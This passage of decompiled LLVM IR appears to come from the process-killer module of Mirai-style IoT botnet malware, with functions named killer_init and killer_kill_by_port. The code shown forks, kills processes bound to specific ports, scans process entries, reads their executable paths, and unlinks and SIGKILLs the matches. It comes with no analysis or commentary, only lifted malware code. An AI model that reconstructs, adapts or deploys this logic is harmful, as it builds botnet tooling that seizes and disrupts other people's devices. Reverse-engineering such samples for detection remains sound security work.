  %v3_ce14 = call i32 @util_atoi(i8* %v2_ce14, i32 10)
  %v2_ce1c = call i32 @kill(i32 %v3_ce14, i32 9)
  %v0_ce20 = load i32, i32* @r8, align 4
  %v1_ce24 = inttoptr i32 %v0_ce20 to i32*
  %v2_ce24 = call i32 @__GI_readdir(i32* %v1_ce24)
  store i32 %v2_ce24, i32* @r6, align 4
  %v2_ce28 = icmp eq i32 %v2_ce24, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_ce28, label %dec_label_pc_ce3c, label %dec_label_pc_cd4c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cd34.loopexit, %dec_label_pc_ce14, %dec_label_pc_cd4c, %dec_label_pc_cd34.preheader
  %v0_ce3c = load i32, i32* @r8, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @__GI_closedir(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @sb, align 4
  %v1_ce48 = inttoptr i32 %v0_ce44 to i32*
  %v2_ce48 = call i32 @__GI_readdir(i32* %v1_ce48)
  %v2_ce4c = icmp eq i32 %v2_ce48, 0
  br i1 %v2_ce4c, label %dec_label_pc_ce54, label %dec_label_pc_cc50

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cc40.loopexit, %dec_label_pc_ce3c, %dec_label_pc_cc50, %dec_label_pc_cc40.preheader
  %v0_ce54 = load i32, i32* @sb, align 4
  %v1_ce58 = inttoptr i32 %v0_ce54 to i32*
  %v2_ce58 = call i32 @__GI_closedir(i32* %v1_ce58)
  %v0_ce5c = load i32, i32* @r5, align 4
  %v1_ce5c = urem i32 %v0_ce5c, 256
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_ce54
  %storemerge = phi i32 [ %v1_ce5c, %dec_label_pc_ce54 ], [ 0, %dec_label_pc_cc20 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce64 = call i32 @sleep(i32 1)
  %v1_ce6c = call i32 @table_lock_val(i32 13)
  %v1_ce74 = call i32 @table_lock_val(i32 14)
  %v1_ce7c = call i32 @table_lock_val(i32 15)
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %bb, %dec_label_pc_cec0, %dec_label_pc_ce60
  %v0_ce80 = load i32, i32* @r4, align 4
  store i32 %v3_c97c, i32* @r4, align 4
  store i32 %v6_c97c, i32* @r5, align 4
  store i32 %v9_c97c, i32* @r6, align 4
  store i32 %v12_c97c, i32* @r7, align 4
  store i32 %v15_c97c, i32* @r8, align 4
  store i32 %v18_c97c, i32* @sb, align 4
  store i32 %v21_c97c, i32* @sl, align 4
  store i32 %v24_c97c, i32* @fp, align 4
  store i32 %v27_c97c, i32* @lr, align 4
  ret i32 %v0_ce80

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cb74
  %v1_ce94 = add i32 %v0_ce94, 1
  %v7_ce98 = icmp eq i32 %v0_ce94, 0
  br i1 %v7_ce98, label %dec_label_pc_cea0, label %dec_label_pc_cb7c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce94
  %v1_cea0 = add i32 %v0_cb84, 3
  %v2_cea0 = inttoptr i32 %v1_cea0 to i8*
  %v3_cea0 = load i8, i8* %v2_cea0, align 1
  %v7_cea4 = icmp eq i8 %v3_cea0, 65
  br i1 %v7_cea4, label %dec_label_pc_ceb8, label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %dec_label_pc_cea0, %dec_label_pc_ceb8
  %v0_cb8c82 = phi i32 [ %v0_cb8c83, %dec_label_pc_cea0 ], [ 1, %dec_label_pc_ceb8 ]
  br label %dec_label_pc_cb54.backedge

dec_label_pc_cb54.backedge:                       ; preds = %dec_label_pc_ceac, %dec_label_pc_cb80
  %v0_cb8c81 = phi i32 [ %v0_cb8c82, %dec_label_pc_ceac ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v0_ce9473 = phi i32 [ %v1_ce94, %dec_label_pc_ceac ], [ %v0_cb80, %dec_label_pc_cb80 ]
  %v0_cb74.pr70 = phi i32 [ 0, %dec_label_pc_ceac ], [ %v0_cb74.pr71, %dec_label_pc_cb80 ]
  %v0_cb54 = add i32 %v0_cb84, 1
  %v1_cb54 = add i32 %v0_cb84, 3
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  store i32 %v4_cb54, i32* @r3, align 4
  %v2_cb58 = icmp eq i8 %v3_cb54, 0
  %v1_cb5c = add i32 %v0_cb5c78, 1
  br i1 %v2_cb58, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_cea0
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cc04
  %v1_cec4 = call i32 @table_lock_val(i32 13)
  %v1_cecc = call i32 @table_lock_val(i32 14)
  %v1_ced4 = call i32 @table_lock_val(i32 15)
  %v1_cedc = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ce80

dec_label_pc_cee4:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca28

; uselistorder directives
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v4_cb54, { 1, 0 }
  uselistorder i32 %v0_cb8c81, { 1, 0 }
  uselistorder i32 %v1_ce94, { 1, 0 }
  uselistorder i32 %v2_ce48, { 1, 0 }
  uselistorder i32 %v1_cbb8, { 1, 0 }
  uselistorder i32 %v0_cbc430, { 1, 0 }
  uselistorder i32 %v1_cbdc, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v0_cb5c78, { 1, 0 }
  uselistorder i32 %v0_ce94, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb8c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb5c54, { 1, 0 }
  uselistorder i32 %v2_cb40, { 1, 0 }
  uselistorder i32 %v1_cb3c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cafc, { 0, 2, 1 }
  uselistorder i32 %v0_cafc16, { 1, 0 }
  uselistorder i32 %v1_cac8, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca58, { 1, 2, 0 }
  uselistorder i32 %v0_ca00, { 1, 0 }
  uselistorder i32 %v2_c9fc, { 1, 0, 2 }
  uselistorder i8* %v3_c9e4, { 1, 0, 2 }
  uselistorder i32 %v2_c9c4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_cd4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
  uselistorder label %dec_label_pc_cc50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc40.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb08, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca6c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca84, { 1, 0 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8384 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %v3_cf10 = load i32, i32* @r4, align 4
  %v6_cf10 = load i32, i32* @r5, align 4
  %v9_cf10 = load i32, i32* @r6, align 4
  %v12_cf10 = load i32, i32* @r7, align 4
  %v15_cf10 = load i32, i32* @r8, align 4
  %v18_cf10 = load i32, i32* @sb, align 4
  %v21_cf10 = load i32, i32* @sl, align 4
  %v24_cf10 = load i32, i32* @fp, align 4
  %v27_cf10 = load i32, i32* @lr, align 4
  %v2_cf20 = call i32 @__GI_time(i32* null)
  store i32 %v2_cf20, i32* @r7, align 4
  %v0_cf28 = call i32 @__libc_fork()
  %v7_cf2c = icmp eq i32 %v0_cf28, -1
  %. = zext i1 %v7_cf2c to i32
  %tmp125 = icmp slt i32 %v0_cf28, 1
  %storemerge96 = select i1 %tmp125, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_241f8.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf48 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cf28, i32* @global_var_241f8.71, align 4
  br i1 %v2_cf48, label %dec_label_pc_cf64, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_d084, %dec_label_pc_cf64, %entry
  %v1_cf60 = phi i32 [ %v2_d01c, %dec_label_pc_cf64 ], [ %v0_cf28, %entry ], [ 0, %dec_label_pc_d084 ]
  store i32 %v3_cf10, i32* @r4, align 4
  store i32 %v6_cf10, i32* @r5, align 4
  store i32 %v9_cf10, i32* @r6, align 4
  store i32 %v12_cf10, i32* @r7, align 4
  store i32 %v15_cf10, i32* @r8, align 4
  store i32 %v18_cf10, i32* @sb, align 4
  store i32 %v21_cf10, i32* @sl, align 4
  store i32 %v24_cf10, i32* @fp, align 4
  store i32 %v27_cf10, i32* @lr, align 4
  ret i32 %v1_cf60

dec_label_pc_cf64:                                ; preds = %entry
  %v1_cf68 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_cf70 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_216d8.73 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_241f4.75 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_cf70, i32* %r2.global-to-local, align 4
  %v0_cf80 = load i32, i32* @r5, align 4
  %v1_cf80 = trunc i32 %v0_cf80 to i8
  %v3_cf80 = inttoptr i32 %v0_cf70 to i8*
  store i8 %v1_cf80, i8* %v3_cf80, align 1
  %v0_cf88 = load i32, i32* @r5, align 4
  %v1_cf88 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf88 = inttoptr i32 %v1_cf88 to i32*
  store i32 %v0_cf88, i32* %v2_cf88, align 4
  %v0_cf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf8c = inttoptr i32 %v1_cf8c to i32*
  store i32 %v0_cf8c, i32* %v2_cf8c, align 4
  %v1_cf90 = call i32 @table_unlock_val(i32 13)
  %v1_cf98 = call i32 @table_unlock_val(i32 14)
  %v2_cfa0 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_cfa0, i32* %r2.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @r5, align 4
  store i32 %v0_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfa4 to i32*
  %v3_cfb0 = call i32 @table_retrieve_val(i32 13, i32* %v2_cfb0)
  %v1_cfb8 = add i32 %v2_cfa0, -24
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb0, i32* %r1.global-to-local, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v2_cfc8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfc8 = call i32 @util_strcpy(i8* %v2_cfc8, i32 %v3_cfb0)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  %v2_cfd0 = add i32 %v3_cfc8, %v1_cfb8
  store i32 %v2_cfd0, i32* @r4, align 4
  %v1_cfd4 = call i32 @__getpid(i32 %v3_cfc8)
  %v2_cfdc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_cfdc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfe4 = trunc i32 %v1_cfd4 to i8
  %v4_cfe4 = call i32 @util_itoa(i8 %v3_cfe4, i32 10, i32 %v2_cfdc)
  store i32 %v4_cfe4, i32* %r1.global-to-local, align 4
  %v0_cfec = load i32, i32* @r4, align 4
  store i32 %v0_cfec, i32* @r0, align 4
  %v2_cff0 = inttoptr i32 %v0_cfec to i8*
  %v3_cff0 = call i32 @util_strcpy(i8* %v2_cff0, i32 %v4_cfe4)
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  %v1_cff8 = load i32, i32* @r4, align 4
  %v2_cff8 = add i32 %v1_cff8, %v3_cff0
  store i32 %v2_cff8, i32* @r4, align 4
  %v2_d000 = inttoptr i32 %v0_cff4 to i32*
  %v3_d000 = call i32 @table_retrieve_val(i32 14, i32* %v2_d000)
  store i32 %v3_d000, i32* %r1.global-to-local, align 4
  %v0_d008 = load i32, i32* @r4, align 4
  store i32 %v0_d008, i32* @r0, align 4
  %v2_d00c = inttoptr i32 %v0_d008 to i8*
  %v3_d00c = call i32 @util_strcpy(i8* %v2_d00c, i32 %v3_d000)
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 %v3_d00c, i32* @r6, align 4
  %v2_d01c = call i32 @__libc_open(i32 %v1_cfb8, i32 %v0_d010)
  %v7_d020 = icmp eq i32 %v2_d01c, -1
  br i1 %v7_d020, label %dec_label_pc_cf54, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cf64
  %v1_d028 = call i32 @__GI___libc_close(i32 %v2_d01c)
  %v1_d030 = call i32 @table_lock_val(i32 13)
  %v1_d038 = call i32 @table_lock_val(i32 14)
  store i32 ptrtoint (i32* @global_var_241f4.75 to i32), i32* %r3.global-to-local, align 4
  %v2_d044 = load i32, i32* @global_var_241f4.75, align 4
  store i32 %v2_d044, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d050 = call i32 @readlink(i32 %v1_cfb8, i32 %v2_d044, i32 4095)
  %v7_d054 = icmp eq i32 %v3_d050, -1
  br i1 %v7_d054, label %.thread9, label %bb128

bb128:                                            ; preds = %dec_label_pc_d028
  store i32 ptrtoint (i32* @global_var_241f4.75 to i32), i32* %r1.global-to-local, align 4
  %v3_d05c = load i32, i32* @global_var_241f4.75, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r5, align 4
  %v2_d060 = trunc i32 %v1_d060 to i8
  %v5_d060 = add i32 %v3_d05c, %v3_d050
  %v6_d060 = inttoptr i32 %v5_d060 to i8*
  store i8 %v2_d060, i8* %v6_d060, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d028, %bb128
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @r6, align 4
  %v1_d068 = load i32, i32* @r4, align 4
  %v1_cfb8.neg = sub i32 24, %v2_cfa0
  %v2_d068 = add i32 %v1_cfb8.neg, %v0_d068
  %v2_d06c = add i32 %v2_d068, %v1_d068
  store i32 %v2_d06c, i32* @r1, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v0_d074 = call i32 @util_zero()
  %v0_d078 = load i32, i32* @r7, align 4
  store i32 %v0_d078, i32* @r4, align 4
  %v0_d07c = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d1a8 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d1b4 = bitcast i32* %stack_var_-128 to i8*
  %v2_d1f8 = ptrtoint i32* %stack_var_-192 to i32
  %v2_d1fc = bitcast i32* %stack_var_-192 to i8*
  %v2_d348 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d35c = ptrtoint i32* %stack_var_-48 to i32
  %v2_d370 = ptrtoint i32* %stack_var_-8384 to i32
  %v2_d38c = ptrtoint i32* %stack_var_-208 to i32
  br label %dec_label_pc_d084

dec_label_pc_d084:                                ; preds = %dec_label_pc_d170, %.thread9
  %stack_var_-8388.0 = phi i32 [ %v0_d07c, %.thread9 ], [ %stack_var_-8388.3, %dec_label_pc_d170 ]
  %v1_d088 = call i32 @table_unlock_val(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d094 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_d098 = call i32 @__GI_opendir(i32 %v3_d094)
  store i32 %v1_d098, i32* @sb, align 4
  %v2_d09c = icmp eq i32 %v1_d098, 0
  br i1 %v2_d09c, label %dec_label_pc_cf54, label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d084
  %v1_d0a8 = call i32 @table_lock_val(i32 13)
  %v1_d0b4 = call i32 @killer_kill_by_port(i32 58811)
  %v1_d0c0 = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c700.76 to i32), i32 7))
  %v1_d0cc = call i32 @killer_kill_by_port(i32 14853)
  %v0_d0d060 = load i32, i32* @sb, align 4
  %v1_d0d461 = inttoptr i32 %v0_d0d060 to i32*
  %v2_d0d462 = call i32 @__GI_readdir(i32* %v1_d0d461)
  %v2_d0d864 = icmp eq i32 %v2_d0d462, 0
  br i1 %v2_d0d864, label %dec_label_pc_d170, label %dec_label_pc_d0e0.preheader

dec_label_pc_d0e0.preheader:                      ; preds = %dec_label_pc_d0a4, %dec_label_pc_d0d0.backedge
  %v0_d0e072 = phi i32 [ %v2_d0d4, %dec_label_pc_d0d0.backedge ], [ %v2_d0d462, %dec_label_pc_d0a4 ]
  %stack_var_-8388.165 = phi i32 [ %stack_var_-8388.1.be, %dec_label_pc_d0d0.backedge ], [ %stack_var_-8388.0, %dec_label_pc_d0a4 ]
  br label %dec_label_pc_d0e0

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d0e0.preheader, %dec_label_pc_d158
  %v0_d0f0 = phi i32 [ %v2_d164, %dec_label_pc_d158 ], [ %v0_d0e072, %dec_label_pc_d0e0.preheader ]
  %stack_var_-8388.2 = phi i32 [ %v1_d104, %dec_label_pc_d158 ], [ %stack_var_-8388.165, %dec_label_pc_d0e0.preheader ]
  %v1_d0e0 = add i32 %v0_d0f0, 11
  %v2_d0e0 = inttoptr i32 %v1_d0e0 to i8*
  %v3_d0e0 = load i8, i8* %v2_d0e0, align 1
  %v4_d0e0 = zext i8 %v3_d0e0 to i32
  %v1_d0e4 = add nsw i32 %v4_d0e0, -48
  store i32 %v1_d0e4, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d0e4, 9
  br i1 %tmp, label %dec_label_pc_d0d0.backedge, label %dec_label_pc_d0f0

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d0e0
  store i32 %v1_d0e0, i32* @r6, align 4
  store i32 %v1_d0e0, i32* @r0, align 4
  %v1_d0f8 = call i32 @atol(i32 %v1_d0e0)
  %v0_d100 = load i32, i32* @r5, align 4
  %v1_d104 = add i32 %stack_var_-8388.2, 1
  store i32 %v1_d104, i32* %r3.global-to-local, align 4
  store i32 %v1_d0f8, i32* @r8, align 4
  %v5_d110 = icmp slt i32 %v0_d100, %v1_d0f8
  %v2_d180 = call i32 @__GI_time(i32* null)
  br i1 %v5_d110, label %dec_label_pc_d17c, label %dec_label_pc_d114

dec_label_pc_d114:                                ; preds = %dec_label_pc_d0f0
  %v0_d11c = load i32, i32* @r4, align 4
  %v2_d11c = sub i32 %v2_d180, %v0_d11c
  %v7_d124 = icmp slt i32 %v2_d11c, 601
  br i1 %v7_d124, label %dec_label_pc_d12c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d114
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d0d0.backedge

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d114
  %v0_d12c = load i32, i32* @r8, align 4
  %v7_d130 = icmp slt i32 %v0_d12c, 401
  br i1 %v7_d130, label %dec_label_pc_d0d0.backedge, label %dec_label_pc_d134

dec_label_pc_d134:                                ; preds = %dec_label_pc_d12c
  %v3_d13c = zext i32 %v1_d104 to i64
  %v4_d13c = mul nuw i64 %v3_d13c, 3435973837
  %v7_d13c = trunc i64 %v4_d13c to i32
  store i32 %v7_d13c, i32* %r1.global-to-local, align 4
  %v3_d1401 = udiv i64 %v4_d13c, 34359738368
  %v3_d1443 = mul nuw nsw i64 %v3_d1401, 8
  %v3_d144 = trunc i64 %v3_d1443 to i32
  store i32 %v3_d144, i32* %r3.global-to-local, align 4
  %v2_d1485 = mul nuw nsw i64 %v3_d1401, 2
  %v2_d148 = trunc i64 %v2_d1485 to i32
  %v2_d14c = add i32 %v3_d144, %v2_d148
  store i32 %v2_d14c, i32* %r2.global-to-local, align 4
  %v9_d150 = icmp eq i32 %v1_d104, %v2_d14c
  br i1 %v9_d150, label %dec_label_pc_d158, label %dec_label_pc_d0d0.backedge

dec_label_pc_d158:                                ; preds = %dec_label_pc_d134
  %v1_d15c = call i32 @sleep(i32 1)
  %v0_d160 = load i32, i32* @sb, align 4
  %v1_d164 = inttoptr i32 %v0_d160 to i32*
  %v2_d164 = call i32 @__GI_readdir(i32* %v1_d164)
  %v2_d168 = icmp eq i32 %v2_d164, 0
  br i1 %v2_d168, label %dec_label_pc_d170, label %dec_label_pc_d0e0

dec_label_pc_d170:                                ; preds = %dec_label_pc_d0d0.backedge, %dec_label_pc_d158, %dec_label_pc_d0a4
  %stack_var_-8388.3 = phi i32 [ %stack_var_-8388.0, %dec_label_pc_d0a4 ], [ %v1_d104, %dec_label_pc_d158 ], [ %stack_var_-8388.1.be, %dec_label_pc_d0d0.backedge ]
  %v0_d170 = load i32, i32* @sb, align 4
  %v1_d174 = inttoptr i32 %v0_d170 to i32*
  %v2_d174 = call i32 @__GI_closedir(i32* %v1_d174)
  br label %dec_label_pc_d084

dec_label_pc_d17c:                                ; preds = %dec_label_pc_d0f0
  %v1_d18c = call i32 @table_unlock_val(i32 13)
  %v1_d194 = call i32 @table_unlock_val(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d1a0 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_d1a8, i32* @fp, align 4
  store i32 %v3_d1a0, i32* %r1.global-to-local, align 4
  store i32 %v2_d1a8, i32* @r0, align 4
  %v3_d1b4 = call i32 @util_strcpy(i8* %v2_d1b4, i32 %v3_d1a0)
  %v1_d1b8 = load i32, i32* @fp, align 4
  %v2_d1b8 = add i32 %v1_d1b8, %v3_d1b4
  store i32 %v2_d1b8, i32* %r5.global-to-local, align 4
  %v0_d1bc = load i32, i32* @r6, align 4
  store i32 %v0_d1bc, i32* %r1.global-to-local, align 4
  store i32 %v2_d1b8, i32* @r0, align 4
  %v2_d1c4 = inttoptr i32 %v2_d1b8 to i8*
  %v3_d1c4 = call i32 @util_strcpy(i8* %v2_d1c4, i32 %v0_d1bc)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d1d4 = call i32 @table_retrieve_val(i32 14, i32* null)
  store i32 %v3_d1d4, i32* %r1.global-to-local, align 4
  %v1_d1dc = load i32, i32* %r5.global-to-local, align 4
  %v2_d1dc = add i32 %v1_d1dc, %v3_d1c4
  store i32 %v2_d1dc, i32* @r0, align 4
  %v2_d1e0 = inttoptr i32 %v2_d1dc to i8*
  %v3_d1e0 = call i32 @util_strcpy(i8* %v2_d1e0, i32 %v3_d1d4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d1ec = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v3_d1ec, i32* %r1.global-to-local, align 4
  store i32 %v2_d1f8, i32* @r0, align 4
  %v3_d1fc = call i32 @util_strcpy(i8* %v2_d1fc, i32 %v3_d1ec)
  store i32 %v2_d1f8, i32* %r2.global-to-local, align 4
  %v2_d208 = add i32 %v3_d1fc, %v2_d1f8
  store i32 %v2_d208, i32* @r5, align 4
  %v0_d20c = load i32, i32* @r6, align 4
  store i32 %v0_d20c, i32* %r1.global-to-local, align 4
  store i32 %v2_d208, i32* @r0, align 4
  %v2_d214 = inttoptr i32 %v2_d208 to i8*
  %v3_d214 = call i32 @util_strcpy(i8* %v2_d214, i32 %v0_d20c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d214, i32* @r4, align 4
  %v3_d224 = call i32 @table_retrieve_val(i32 29, i32* null)
  store i32 %v3_d224, i32* %r1.global-to-local, align 4
  %v0_d22c = load i32, i32* @r4, align 4
  %v1_d22c = load i32, i32* @r5, align 4
  %v2_d22c = add i32 %v1_d22c, %v0_d22c
  store i32 %v2_d22c, i32* @r0, align 4
  %v2_d230 = inttoptr i32 %v2_d22c to i8*
  %v3_d230 = call i32 @util_strcpy(i8* %v2_d230, i32 %v3_d224)
  %v1_d238 = call i32 @table_lock_val(i32 13)
  %v1_d240 = call i32 @table_lock_val(i32 14)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d254 = call i32 @readlink(i32 %v2_d1a8, i32 %v1_cfb8, i32 4095)
  %v7_d258 = icmp eq i32 %v3_d254, -1
  store i32 %v3_d254, i32* @r5, align 4
  br i1 %v7_d258, label %dec_label_pc_d31c, label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d17c
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d26c = add i32 %v3_d254, %v1_cfb8
  %v5_d26c = inttoptr i32 %v4_d26c to i8*
  store i8 0, i8* %v5_d26c, align 1
  %v1_d274 = call i32 @table_unlock_val(i32 30)
  %v0_d278 = load i32, i32* @r4, align 4
  store i32 %v0_d278, i32* %r1.global-to-local, align 4
  %v2_d280 = inttoptr i32 %v0_d278 to i32*
  %v3_d280 = call i32 @table_retrieve_val(i32 30, i32* %v2_d280)
  %v0_d284 = load i32, i32* @r5, align 4
  %v1_d284 = add i32 %v0_d284, -1
  store i32 %v1_d284, i32* @r1, align 4
  store i32 %v3_d280, i32* %r2.global-to-local, align 4
  %v4_d290 = call i32 @util_stristr(i8* %v2_cfc8, i32 %v1_d284, i32 %v3_d280)
  %v7_d294 = icmp eq i32 %v4_d290, -1
  br i1 %v7_d294, label %dec_label_pc_d2b0, label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d264
  %v1_d2a0 = call i32 @unlink(i32 %v1_cfb8)
  %v0_d2a4 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d2ac = call i32 @kill(i32 %v0_d2a4, i32 9)
  br label %dec_label_pc_d2b0

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d264, %dec_label_pc_d29c
  %v1_d2b4 = call i32 @table_lock_val(i32 30)
  %v1_d2b8 = call i32 @__getpid(i32 %v1_d2b4)
  store i32 %v1_d2b8, i32* @r0, align 4
  %v1_d2bc = load i32, i32* @r8, align 4
  %v9_d2bc = icmp eq i32 %v1_d2b8, %v1_d2bc
  br i1 %v9_d2bc, label %dec_label_pc_d2e8, label %dec_label_pc_d2c4

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2b0
  %v0_d2c4 = call i32 @getppid()
  %v1_d2c8 = load i32, i32* @r8, align 4
  %v9_d2c8 = icmp eq i32 %v0_d2c4, %v1_d2c8
  br i1 %v9_d2c8, label %dec_label_pc_d2e8, label %dec_label_pc_d2d0

dec_label_pc_d2d0:                                ; preds = %dec_label_pc_d2c4
  store i32 ptrtoint (i32* @global_var_241f4.75 to i32), i32* %r2.global-to-local, align 4
  %v2_d2d8 = load i32, i32* @global_var_241f4.75, align 4
  store i32 %v2_d2d8, i32* %r1.global-to-local, align 4
  %v4_d2dc = call i32 @util_strcmp(i8* %v2_cfc8, i32 %v2_d2d8, i32 ptrtoint (i32* @global_var_241f4.75 to i32))
  %v2_d2e0 = icmp eq i32 %v4_d2dc, 0
  br i1 %v2_d2e0, label %dec_label_pc_d2f4, label %dec_label_pc_d2d0.dec_label_pc_d2e8_crit_edge

dec_label_pc_d2d0.dec_label_pc_d2e8_crit_edge:    ; preds = %dec_label_pc_d2d0
  %v0_d2ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d2e8

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d2d0.dec_label_pc_d2e8_crit_edge, %dec_label_pc_d2c4, %dec_label_pc_d2b0
  %v0_d2ec = phi i32 [ %v0_d2ec.pre, %dec_label_pc_d2d0.dec_label_pc_d2e8_crit_edge ], [ %v0_d2c4, %dec_label_pc_d2c4 ], [ %v1_d2b8, %dec_label_pc_d2b0 ]
